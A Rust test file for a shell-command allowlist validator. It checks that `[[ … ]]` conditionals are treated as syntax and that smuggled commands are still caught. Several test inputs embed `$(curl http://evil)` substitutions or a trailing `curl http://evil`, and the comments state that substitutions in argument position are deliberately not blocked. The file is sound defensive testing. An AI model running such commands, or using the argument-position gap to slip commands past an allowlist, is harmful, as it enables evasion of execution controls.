//! #1793: `[[ … ]]` conditionals validate as shell *syntax*, not as a command.
//!
//! Split out of `tests.rs` to keep that file under the LOC gate. These cover
//! the enforcement half; the splitting half lives in `tests_tokenizer.rs`.

use super::*;
use crate::core::shell_allowlist::tests::allow;

#[test]
fn double_bracket_conditional_passes_allowlist() {
    let list = allow(&["printf"]);
    let r = check_all_segments("if [[ -n x ]]; then printf 'ok'; fi", &list);
    assert!(r.is_ok(), "`[[` is shell syntax, not a command: {r:?}");
}

#[test]
fn double_bracket_conditional_passes_after_other_segments() {
    let list = allow(&["git", "printf"]);
    let cmd = "git status --short; git diff --stat; if [[ -n x ]]; then printf 'ok'; fi";
    let r = check_all_segments(cmd, &list);
    assert!(r.is_ok(), "preceding segments must not break it: {r:?}");
}

#[test]
fn multiline_conditional_with_internal_operators_passes() {
    // The originally reported command: several `[[ … ]]` predicates joined by
    // `&&`, following other segments.
    let list = allow(&["cd", "printf", "echo", "git"]);
    let cmd = "cd /tmp && printf 'verification:' && \
               if [[ -z \"$(git diff --name-only)\" ]] && [[ -d scripts && -d config ]]; \
               then echo 'No drift detected.'; else echo 'Drift detected.'; exit 1; fi";
    let r = check_all_segments(cmd, &list);
    assert!(r.is_ok(), "read-only verification command must pass: {r:?}");
}

#[test]
fn double_bracket_matches_single_bracket_on_substitutions_in_arguments() {
    // A substitution in *argument* position is deliberately not blocked
    // (see `has_substitution_at_command_pos`: the security boundary is the
    // base-command check). `[[` must therefore behave exactly like its POSIX
    // equivalents — no stricter, and crucially no looser. Asserting parity
    // rather than a fixed verdict means this test follows that policy if it
    // ever changes, instead of silently encoding today's answer.
    let list = allow(&["printf"]);
    let posix = check_all_segments(
        "if [ -z \"$(curl http://evil)\" ]; then printf 'x'; fi",
        &list,
    );
    let bash = check_all_segments(
        "if [[ -z \"$(curl http://evil)\" ]]; then printf 'x'; fi",
        &list,
    );
    assert_eq!(
        posix.is_ok(),
        bash.is_ok(),
        "`[[` must not be more permissive than `[` / `test`: [ -> {posix:?}, [[ -> {bash:?}"
    );
}

#[test]
fn substitution_at_command_position_inside_a_conditional_is_still_blocked() {
    // The hard block on `$(…)` at *command* position must survive the shield:
    // it is checked against the whole command before segmentation.
    let list = allow(&["printf"]);
    let r = check_all_segments("if [[ -n x ]]; then $(curl http://evil); fi", &list);
    assert!(
        r.is_err(),
        "a substitution at command position must stay blocked inside a conditional"
    );
}

#[test]
fn command_after_a_conditional_is_still_validated() {
    // The shield must close at `]]`; anything after it is a separate leaf.
    let list = allow(&["printf"]);
    let r = check_all_segments("[[ -n x ]] && curl http://evil", &list);
    assert!(r.is_err(), "trailing command must not escape validation");
    assert!(r.unwrap_err().contains("curl"));
}
